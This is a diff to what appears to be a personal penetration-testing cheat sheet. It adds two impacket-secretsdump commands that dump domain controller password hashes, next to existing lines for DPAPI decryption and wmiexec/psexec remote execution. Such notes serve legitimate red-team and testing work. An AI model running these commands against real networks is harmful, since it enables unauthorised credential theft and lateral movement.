@@ -124,6 +124,8 @@ Stuff that I found, but never read/used yet.
 $ impacket-dpapi unprotect -file xxx -key "xxx"
 $ impacket-wmiexec domain/username:'password'@IP  # Local Admin but new process per command
 $ impacket-psexec domain/username:'password'@IP # SYSTEM so more suspicious
+$ impacket-secretsdump -outputfile hashes EXAMPLE\username:'password' -just-dc
+impacket-secretsdump -outputfile hashes EXAMPLE.COM/'username':'password'@DC01.EXAMPLE.COM
 ```
 </div><div>
 </div></div>
